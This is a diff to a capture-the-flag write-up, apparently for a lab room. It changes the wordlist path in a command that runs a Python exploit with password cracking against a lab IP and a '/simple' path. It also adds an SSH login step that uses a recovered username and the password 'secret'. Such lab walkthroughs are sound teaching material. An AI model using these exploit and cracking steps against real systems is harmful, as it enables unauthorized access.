@@ -63,7 +63,7 @@ we run the python exploit and specify the rhosts and using --crack we will attem
 ```
 
 ```json
-python3 exploit.py -u http://10.10.208.204/simple --crack -w /thm/best110.txt 
+python3 exploit.py -u http://10.10.208.204/simple --crack -w /your/wordlist.txt 
 ```
 ```
 [+] Salt for password found: 1dac0d92e9fa6bb2
@@ -81,6 +81,10 @@ answer: secret
 
 ```
 answer: ssh
+```
+```json
+ssh mitch@$ip 
+password is secret
 ```
 
 # 7. What's the user flag?
